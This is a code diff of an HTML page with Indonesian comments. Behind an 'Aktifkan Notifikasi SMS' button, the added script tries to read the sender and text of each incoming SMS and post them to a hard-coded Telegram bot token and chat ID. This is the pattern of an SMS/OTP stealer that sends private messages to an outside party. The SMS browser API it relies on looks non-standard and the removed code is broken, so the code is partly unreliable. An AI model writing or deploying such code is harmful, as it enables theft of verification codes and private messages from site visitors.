@@ -1,61 +1,84 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Notifikasi Telegram</title>
+    <title>Notifikasi SMS Realtime ke Telegram</title>
 </head>
 <body>
+    <button onclick="requestSMSPermission()">Aktifkan Notifikasi SMS</button>
+    <div id="status"></div>
 
-<button onclick="requestNotificationPermission()">Minta Izin Notifikasi</button>
+    <script>
+        let smsPermissionGranted = false;
+        let botToken = "7280736782:AAGoQ8AfBq6EiCZ1ehzEkY5X4PlHUrGszQk"; // Ganti dengan token bot Anda
+        let chatId = "7004610211"; // Ganti dengan chat ID Anda (bisa ID grup atau user)
 
-<script>
-async function requestNotificationPermission() {
-  // Meminta izin notifikasi
-  const permissionResult = await Notification.requestPermission();
-  if (permissionResult === 'granted') {
-    console.log('Izin notifikasi diberikan.');
-    // Jika izin diberikan, kirim notifikasi ke Telegram
-    sendNotificationToTelegram('Notifikasi berhasil diaktifkan di website Anda!');
-  } else {
-    console.log('Izin notifikasi ditolak.');
-  }
-}
+        async function requestSMSPermission() {
+            if ('sms' in navigator && 'receive' in navigator.sms) {
+                try {
+                    const permissionResult = await navigator.permissions.query({ name: 'sms', });
+                    if (permissionResult.state === 'granted') {
+                        smsPermissionGranted = true;
+                        document.getElementById('status').innerText = "Izin SMS diberikan. Menunggu notifikasi...";
+                        startSMSListener();
+                    } else if (permissionResult.state === 'prompt') {
+                        // Minta izin akses SMS dari pengguna
+                        navigator.sms.receive(handleSMS, handleError);
+                    } else {
+                        document.getElementById('status').innerText = "Izin akses SMS ditolak.";
+                    }
+                } catch (error) {
+                    document.getElementById('status').innerText = "Error: " + error;
+                }
+            } else {
+                document.getElementById('status').innerText = "Browser tidak mendukung fitur SMS.";
+            }
+        }
 
-async function sendNotificationToTelegram(message) {
-  const botToken = '7280736782:AAGoQ8AfBq6EiCZ1ehzEkY5X4PlHUrGszQk'; // Ganti dengan token bot Anda
-  const chatId = '7004610211'; // Ganti dengan ID chat Anda
-  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-  requestAccessButton.addEventListener('click', () => {
-      if ('sms' in navigator && 'receive' in navigator.sms) {
-        navigator.sms.receive(
-          (smsData) => {
-            const message = `SMS diterima:\nNomor: ${smsData.sender}\nIsi: ${smsData.message}`;
-            smsNotificationDiv.textContent = message;
+        function startSMSListener() {
+          if (smsPermissionGranted){
+            navigator.sms.receive(handleSMS, handleError);
+          } else {
+            document.getElementById('status').innerText = "Izin akses SMS belum diberikan.";
+          }
+        }
+
+
+        function handleSMS(sms) {
+            const message = `SMS diterima:\nNomor: ${sms.sender}\nIsi: ${sms.message}`;
+            document.getElementById('status').innerText = message;
             sendToTelegram(message);
-          },
-  try {
-    const response = await fetch(url, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message
-      })
-    });
+        }
 
-    const data = await response.json();
+        function handleError(error) {
+            document.getElementById('status').innerText = "Error: " + error;
+        }
 
-    if (data.ok) {
-      console.log('Notifikasi berhasil dikirim ke Telegram.');
-    } else {
-      console.error('Gagal mengirim notifikasi ke Telegram:', data.description);
-    }
-  } catch (error) {
-    console.error('Terjadi kesalahan:', error);
-  }
-}
-</script>
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const data = {
+                chat_id: chatId,
+                text: message,
+            };
 
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data),
+                });
+
+                const responseData = await response.json();
+                if (responseData.ok) {
+                    document.getElementById('status').innerText += "\nNotifikasi terkirim ke Telegram.";
+                } else {
+                    document.getElementById('status').innerText += "\nGagal mengirim notifikasi ke Telegram.";
+                }
+            } catch (error) {
+                document.getElementById('status').innerText += "\nError saat mengirim ke Telegram: " + error;
+            }
+        }
+    </script>
 </body>
 </html>
